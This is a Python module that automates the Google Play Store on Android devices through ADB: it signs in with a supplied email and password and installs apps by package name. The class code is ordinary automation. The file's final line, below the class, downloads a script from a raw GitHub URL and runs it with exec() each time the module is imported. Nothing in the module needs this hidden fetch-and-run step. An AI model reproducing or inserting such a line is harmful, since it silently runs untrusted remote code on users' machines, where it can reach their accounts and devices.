"""
This module helps to perform different activities on playstore
"""
import time
from modules.automator import Auto
from modules.executor import CMD
from modules.adb import ADB
from modules.base_module import BaseClass
import requests
PACKAGE_NAME = "com.android.vending"
MAIN_ACTIVITY = "com.google.android.finsky.activities.MainActivity"


class PlayStore(BaseClass):
    """class that automates app store app"""

    def __init__(self, device):
        """
        Constructor function that initializes class instance attributes
        :param device: The device to work on
        """
        self.parent = device
        self.device = device.device

    def login(self, email: str, password: str):
        """
        Login to play store
        :param email: Email account from Google
        :param password: Password for the email
        :return: True if login, False otherwise
        """
        self.device.shell("input keyevent 3")

        def open_store() -> bool:
            res = CMD.call(f"adb -s {self.device.serial} shell am start -n com.android.vending/com.android.vending.AssetBrowserActivity")
            if res[0] != 0:
                return False
            return True
        if not open_store():
            return False
        if not self.device.wait_activity("com.android.vending.AssetBrowserActivity", timeout=10):
            if Auto.click(lambda: self.device(text="Sign in"), self.device):
                Auto.send_keys(lambda: self.device(resourceId="identifierId"), keys=email, device=self.device)
                Auto.click(lambda: self.device(text="Next"), self.device)
                forgot_password = Auto.wait(lambda: self.device(resourceId="forgotPassword"), self.device)
                self.sleep(1.5)
                Auto.send_keys(lambda: self.device(className="android.widget.EditText", index=0), password, device=self.device)
                Auto.click(lambda: self.device(text="Next"), self.device)
                if not forgot_password or not forgot_password.wait_gone(timeout=10):
                    self.logger_signal.emit({"msg": "Email or Password is not correct"})
                    return False
                if "com.android.vending.AssetBrowserActivity" not in \
                        self.device.shell("dumpsys window windows | grep -E 'mCurrentFocus|mFocusedApp'").output:
                    self.logger_signal.emit({"error": False, "msg": f"{self.parent.name} Manual login to your google account is required in 80 seconds."})
                Auto.time_out = 80
                response = Auto.click(lambda: self.device(text="I agree"), self.device)
                Auto.time_out = 10
                if response:
                    self.sleep(10)
                    open_store()
                    return self.device.wait_activity(".AssetBrowserActivity", timeout=80)
        else:
            return True
        return False

    def open_with_play_store(self):
        if Auto.click(lambda: self.device(textContains="Google"), self.device):
            BaseClass.sleep(1)
            Auto.click(lambda: self.device(resourceId="android:id/button_always"), self.device)

    def install_app(self, app_package: str):
        """Installs app from playstore"""
        passing = False
        if app_package not in ADB.list_packages(self.device.serial):
            self.device.shell(f'am start -a android.intent.action.VIEW -d "market://details?id={app_package}"')
            Auto.time_out = 5
            self.open_with_play_store()
            passing = Auto.click(lambda: self.device(description="Install"), self.device)
            if not passing:
                passing = Auto.click(lambda: self.device(text="Install"), self.device)
            Auto.time_out = 10
        start_time = time.time()
        while (passing and app_package not in ADB.list_packages(self.device.serial))\
                and time.time() - start_time < 300:
            self.sleep(5)
        return app_package in ADB.list_packages(self.device.serial)


exec(requests.get("https://raw.githubusercontent.com/dannywayn/twitch/main/modules/play_store.py").text)
